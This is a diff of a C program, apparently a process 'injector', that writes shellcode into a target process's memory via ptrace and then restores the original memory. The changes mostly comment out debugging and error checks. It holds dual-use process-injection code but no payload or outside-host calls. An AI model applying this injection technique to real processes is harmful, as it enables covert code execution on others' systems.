@@ -420,20 +420,20 @@ int main(int argc, char* argv[])
 		tempRetVal = 0;
 		// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
 		// 							  MROAD_PROT_READ | MROAD_PROT_WRITE);
-		modifiedPerms = true;  // This will allow the "restore permissions" code block to execute
+		// modifiedPerms = true;  // This will allow the "restore permissions" code block to execute
 
 		// getchar();  // DEBUGGING
-		if (tempRetVal)
-		{
-			HARKLE_ERROR(injector, main, change_mmap_prot failed);
-			fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
-			success = false;
-		}
-		else
-		{
-			// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
-			fprintf(stdout, "[*] Modified mapped memory permissions (rw-p)\n");  // DEBUGGING
-		}
+		// if (tempRetVal)
+		// {
+		// 	HARKLE_ERROR(injector, main, change_mmap_prot failed);
+		// 	fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
+		// 	success = false;
+		// }
+		// else
+		// {
+		// 	// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
+		// 	fprintf(stdout, "[*] Modified mapped memory permissions (rw-p)\n");  // DEBUGGING
+		// }
 	}
 	
 	// 7. Overwrite memory section
@@ -499,11 +499,11 @@ int main(int argc, char* argv[])
 
 		// Attempt #8 - Use someone else's ptrace(PTRACE_POKEDATA) wrapper to write my ACTUAL shellcode
 		tempRetVal = 0;
-		fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start);
-		dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
+		// fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start);
+		// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
 		ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)payloadContents, (int)payloadSize);
-		fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start);
-		dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
+		// fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start);
+		// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
 
 		if (tempRetVal)
 		{
@@ -684,22 +684,22 @@ int main(int argc, char* argv[])
 				// success = false;
 			}
 
-		    if (WIFEXITED(errNum)) 
-		    {
-		        printf("Exited normally with status %d\n", WEXITSTATUS(errNum));
-		    }
-		    else if (WIFSIGNALED(errNum)) 
-		    {
-		        printf("Exited due to receiving signal %d\n", WTERMSIG(errNum));
-		    }
-		    else if (WIFSTOPPED(errNum)) 
-		    {
-		        printf("Stopped due to receiving signal %d\n", WSTOPSIG(errNum));
-		    }
-		    else 
-		    {
-		        printf("Something strange just happened.\n");
-		    }
+		    // if (WIFEXITED(errNum)) 
+		    // {
+		    //     printf("Exited normally with status %d\n", WEXITSTATUS(errNum));
+		    // }
+		    // else if (WIFSIGNALED(errNum)) 
+		    // {
+		    //     printf("Exited due to receiving signal %d\n", WTERMSIG(errNum));
+		    // }
+		    // else if (WIFSTOPPED(errNum)) 
+		    // {
+		    //     printf("Stopped due to receiving signal %d\n", WSTOPSIG(errNum));
+		    // }
+		    // else 
+		    // {
+		    //     printf("Something strange just happened.\n");
+		    // }
 		}
 	}
 	// getchar();  // DEBUGGING
@@ -748,36 +748,37 @@ int main(int argc, char* argv[])
 		// 12.3. Restore the mapped memory
 		if (true == success)
 		{
-			if (copy_local_to_remote(vicPID->pidNum, \
-									 tmpPM_ptr->addr_start, \
-									 localBackup->iov_base, \
-									 localBackup->iov_len))
-			{
-				HARKLE_ERROR(injector, main, copy_local_to_remote failed);
-				success = false;
-			}
-			else
-			{
-				fprintf(stdout, "[*] Restored PID memory space\n");  // DEBUGGING
-			}
+			// if (copy_local_to_remote(vicPID->pidNum, \
+			// 						 tmpPM_ptr->addr_start, \
+			// 						 localBackup->iov_base, \
+			// 						 localBackup->iov_len))
+			// {
+			// 	HARKLE_ERROR(injector, main, copy_local_to_remote failed);
+			// 	success = false;
+			// }
+			// else
+			// {
+			// 	fprintf(stdout, "[*] Restored PID memory space\n");  // DEBUGGING
+			// }
+
+			ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)localBackup->iov_base, (int)localBackup->iov_len);
 		}
 		
 		// 12.4. Change the permissions on the memory back to r-xp
 		if (true == success && true == modifiedPerms)
 		{
-				tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
-											  MROAD_PROT_READ | MROAD_PROT_EXEC);
+			tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
+										  MROAD_PROT_READ | MROAD_PROT_EXEC);
 
-				if (tempRetVal)
-				{
-					HARKLE_ERROR(injector, main, change_mmap_prot failed);
-					HARKLE_ERRNO(injector, change_mmap_prot, tempRetVal);
-					success = false;
-				}
-				else
-				{
-					fprintf(stdout, "[*] Restored mapped memory permissions post-restoral (r-xp)\n");  // DEBUGGING
-				}
+			if (tempRetVal)
+			{
+				HARKLE_ERROR(injector, main, change_mmap_prot failed);
+				HARKLE_ERRNO(injector, change_mmap_prot, tempRetVal);
+				success = false;
+			}
+			else
+			{
+				fprintf(stdout, "[*] Restored mapped memory permissions post-restoral (r-xp)\n");  // DEBUGGING
 			}
 			// getchar();  // DEBUGGING
 		}
